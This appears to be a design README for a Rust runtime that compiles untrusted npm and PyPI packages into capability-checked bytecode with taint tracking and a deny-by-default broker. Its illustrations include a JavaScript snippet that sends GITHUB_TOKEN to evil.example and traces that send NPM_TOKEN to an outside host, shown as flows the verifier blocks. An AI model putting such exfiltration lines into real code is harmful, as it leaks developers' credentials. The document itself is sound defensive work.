# OSS Microcode Runtime

OMC is a runtime architecture for untrusted open-source packages.

The key move is not better package scanning. The key move is treating public
OSS as source material that must lower into a constrained instruction set before
it can run in a real developer, CI, editor, browser, or production environment.

```text
npm / PyPI / extension source
        |
language compiler front end
        |
OMC: OSS Microcode
        |
Rust verifier
        |
Rust runtime kernel
        |
capability broker
        |
host OS, network, filesystem, secrets
```

Do not compile to literal CPU microcode. CPU microcode is controlled by CPU
vendors and firmware signing. Compile to OMC, a small dependency-native
bytecode designed specifically for hostile packages.

## Thesis

No third-party package should execute as JavaScript, Python, native code, shell,
or extension code with ambient authority.

It should first become a verified, typed, permissioned micro-program.

Package managers become compiler front ends and linkers. Dependencies stop being
trusted executable code and become behavior-typed artifacts:

```text
left-pad@1.3.0      : Pure
stripe@12.4.0      : Network(api.stripe.com) + SecretRead(STRIPE_API_KEY)
sharp@0.33.0       : NativeImageCodec + FileRead(input-only)
some-build-tool@5  : BuildOnly + NoRuntime
```

The product surface is not only "is this version vulnerable?" It is "did this
update change what the package is allowed to do?"

```text
some-package 2.1.0 : Pure
some-package 2.1.1 : EnvRead + Network + PostInstall
decision           : block
```

That is a behavioral ABI for dependencies.

## Runtime Shape

The runtime is closer to a tiny operating system for dependencies than a normal
VM.

```text
ossrt/
  crates/
    omc-format/       # bytecode format, encoding, decoding
    omc-loader/       # loads signed package artifacts
    omc-verify/       # validates instructions, capabilities, control flow
    omc-vm/           # interpreter
    omc-memory/       # isolated memory model
    omc-cap/          # capability broker
    omc-taint/        # data-flow labels and secret tracking
    omc-policy/       # policy language and evaluator
    omc-linker/       # links packages as cells
    omc-audit/        # execution log and diff output
    omc-host/         # host integrations
```

The invariant is simple:

```text
No package talks to Rust std directly.
No package talks to the OS directly.
No package gets ambient authority.
```

Everything dangerous goes through the broker.

```rust
pub trait CapabilityBroker {
    fn read_env(
        &mut self,
        cell: CellId,
        name: &str,
    ) -> Result<Labeled<Value>, Trap>;

    fn read_file(
        &mut self,
        cell: CellId,
        path: VirtualPath,
    ) -> Result<Labeled<Value>, Trap>;

    fn http_request(
        &mut self,
        cell: CellId,
        request: HttpRequest<Labeled<Value>>,
    ) -> Result<Labeled<Value>, Trap>;

    fn spawn_process(
        &mut self,
        cell: CellId,
        command: &str,
        args: &[String],
    ) -> Result<Never, Trap>;
}
```

For most packages the default policy is brutal:

```text
spawn_process: denied
read_env: denied
read_file: denied
network: denied
dynamic_eval: denied
```

## Cells

A package becomes a cell.

```rust
pub struct Cell {
    id: CellId,
    module: ModuleId,
    memory: CellMemory,
    policy: Policy,
    fuel: Fuel,
    labels: LabelTable,
}
```

Each cell runs verified OMC instructions.

```rust
pub enum Op {
    Const(ValueId),
    LoadArg(u8),
    StoreLocal(LocalId),
    LoadLocal(LocalId),

    Add,
    Sub,
    Eq,
    Len,
    Slice,
    RegexMatch,
    JsonParse,
    JsonStringify,

    CallLocal(FunctionId),
    CallImport(ImportId),

    Cap(CapOp),

    Return,
    Trap(TrapCode),
}
```

Capability operations are explicit by design.

```rust
pub enum CapOp {
    EnvRead { name: String },
    FsRead { path: VirtualPath },
    FsWrite { path: VirtualPath },
    HttpRequest { request_id: ValueId },
    DnsLookup { host: String },
    TimeNow,
    RandomBytes { len: usize },
    ProcSpawn { command: String },
    DynamicEval { source: ValueId },
}
```

Malware cannot hide behind ordinary language behavior. It has to become an OMC
capability instruction:

```text
CAP_ENV_READ
CAP_HTTP_REQUEST
CAP_FS_READ
CAP_PROC_SPAWN
CAP_DYNAMIC_EVAL
```

Then the verifier or broker can reject it.

## Verifier

The verifier is the core product.

It checks:

```text
1. Is the bytecode well formed?
2. Are all jumps valid?
3. Are all calls typed?
4. Does the package request forbidden instructions?
5. Does secret data flow to forbidden sinks?
6. Does the package behavior match its declared type?
7. Did this update add new capabilities?
```

A pure package should have a profile like this:

```yaml
package: left-pad
type: Pure

capabilities:
  env: none
  filesystem: none
  network: none
  process: none
  dynamic_eval: none
```

If a later version compiles to this:

```text
CAP_ENV_READ "NPM_TOKEN"
CAP_HTTP_REQUEST "https://cdn-update-service.example"
```

the update is blocked before it executes.

## Data-Flow Labels

Values inside the VM carry labels.

```rust
pub struct Labeled<T> {
    value: T,
    label: Label,
}

pub enum Label {
    Public,
    Secret(SecretKind),
    File(PathLabel),
    Env(String),
    Token(TokenKind),
    Network(String),
    Mixed(Vec<Label>),
}
```

This JavaScript:

```js
const token = process.env.GITHUB_TOKEN
fetch("https://evil.example", { body: token })
```

lowers to this behavior:

```text
r1 = CAP_ENV_READ "GITHUB_TOKEN"       # label: secret:github
r2 = CAP_HTTP_REQUEST evil.example r1  # forbidden sink
```

The trap is not "malware detected." The trap is illegal information flow:

```text
secret:github may not flow to network:evil.example
```

That is stronger than pattern matching or reputation scoring.

## Package Managers Become Linkers

Today:

```bash
npm install express
pip install requests
```

OMC moves toward:

```bash
omc npm install express
omc pip install requests
```

The lockfile becomes a microcode link manifest.

```yaml
runtime: ossrt-v1

modules:
  npm:lodash@4.17.21:
    artifact: sha256:...
    type: Pure

  npm:axios@1.7.0:
    artifact: sha256:...
    type: Network
    capabilities:
      network:
        allowed_by_importer: true

  pypi:requests@2.32.3:
    artifact: sha256:...
    type: Network
    capabilities:
      network:
        allowed_by_importer: true
```

The package manager no longer installs unchecked code. It links verified
microcode and local runtime artifacts.

## Runtime Enforcement

Every instruction consumes fuel and every capability operation goes through
policy.

```rust
pub fn run_cell(
    cell: &mut Cell,
    broker: &mut dyn CapabilityBroker,
) -> Result<Value, Trap> {
    loop {
        cell.fuel.consume(1)?;

        let op = cell.next_op()?;

        match op {
            Op::Const(id) => cell.stack.push(cell.constants.get(id)?),

            Op::Add => {
                let b = cell.stack.pop()?;
                let a = cell.stack.pop()?;
                cell.stack.push(a.add_labeled(b)?);
            }

            Op::Cap(cap) => {
                let result = broker.execute(cell.id, &cell.policy, cap)?;
                cell.stack.push(result);
            }

            Op::CallLocal(f) => {
                cell.call_local(f)?;
            }

            Op::Return => {
                return Ok(cell.stack.pop()?.value);
            }

            Op::Trap(code) => {
                return Err(Trap::new(code));
            }

            _ => todo!("more opcodes"),
        }
    }
}
```

The broker owns the dangerous behavior.

```rust
impl CapabilityBroker for DefaultBroker {
    fn read_env(
        &mut self,
        cell: CellId,
        name: &str,
    ) -> Result<Labeled<Value>, Trap> {
        self.policy.require(cell, Capability::EnvRead(name.into()))?;

        let value = self.host.env_read(name)?;

        Ok(Labeled {
            value: Value::String(value),
            label: Label::Env(name.into()),
        })
    }

    fn http_request(
        &mut self,
        cell: CellId,
        request: HttpRequest<Labeled<Value>>,
    ) -> Result<Labeled<Value>, Trap> {
        self.policy.require(cell, Capability::HttpHost(request.host.clone()))?;

        self.policy.check_flows(
            cell,
            request.body.labels(),
            Sink::Network(request.host.clone()),
        )?;

        self.host.http_request(request)
    }

    fn spawn_process(
        &mut self,
        _cell: CellId,
        _command: &str,
        _args: &[String],
    ) -> Result<Never, Trap> {
        Err(Trap::Denied("process spawning denied by default"))
    }
}
```

## Dynamic Languages

JavaScript and Python are dynamic, so the compiler cannot pretend every package
can be statically understood.

The rule is:

```text
Dynamic behavior is not forbidden.
Dynamic behavior requires a capability.
```

Examples:

```text
eval / new Function       -> CAP_DYNAMIC_EVAL
dynamic require/import    -> CAP_DYNAMIC_IMPORT
native extension loading  -> CAP_NATIVE_LOAD
subprocess spawning       -> CAP_PROC_SPAWN
filesystem access         -> CAP_FS_READ / CAP_FS_WRITE
network access            -> CAP_HTTP_REQUEST / CAP_DNS_LOOKUP
```

Most surprise behavior becomes loud.

## Backends

The first implementation should be a small Rust interpreter because it is easier
to test, fuzz, audit, and reason about.

```text
Phase 1:
  OMC bytecode
  Rust interpreter
  verifier
  deny-by-default capability broker
  package behavior diff

Phase 2:
  optimized interpreter
  cached verification
  policy engine
  taint tracking

Phase 3:
  optional Wasm, Cranelift, or native AOT backend
```

Wasm and Cranelift can be execution machinery, but they are not the identity of
the system.

```text
OSS source
  |
OMC semantic microcode
  |
policy verifier
  |
runtime cell
  |
execution backend:
    interpreter
    Wasm
    Cranelift
    native AOT
```

OMC solves trustworthy dependency execution. Backends only make it faster.

## MVP Demo

The first killer output is not performance. It is an update diff that security
teams can understand.

```text
Package: harmless-date-helper@1.2.4
Claimed type: Pure

Compile result:
  FAILED

New capability instructions:
  + CAP_ENV_READ "NPM_TOKEN"
  + CAP_HTTP_REQUEST "https://cdn-update-service.example"

Illegal flow:
  env:NPM_TOKEN -> network:cdn-update-service.example
```

The source may look like a normal utility function. The compiled behavior is
obvious and rejectable.

## Current Position

The current repository is intentionally moving in this order:

```text
1. Rust runtime kernel primitives
2. npm and PyPI compatibility shims
3. registry resolution, lockfiles, and local install trees
4. source profiling into capability findings
5. verifier-enforced OMC artifacts
6. language front ends that lower package code into real cells
```

The long-term standard is:

```text
Dependencies stop being trusted code.
They become verified, typed, permissioned micro-programs.
```

## Related Systems

These projects are useful reference points, not replacements for the OMC model:

- Rust ownership and memory safety: https://doc.rust-lang.org/book/ch04-00-understanding-ownership.html
- capability-oriented Rust APIs such as cap-std: https://docs.rs/cap-std
- WebAssembly Component Model: https://component-model.bytecodealliance.org/
- Wasmtime and WASI: https://docs.wasmtime.dev/
- Cranelift: https://cranelift.dev/
- npm lifecycle scripts: https://docs.npmjs.com/cli/using-npm/scripts
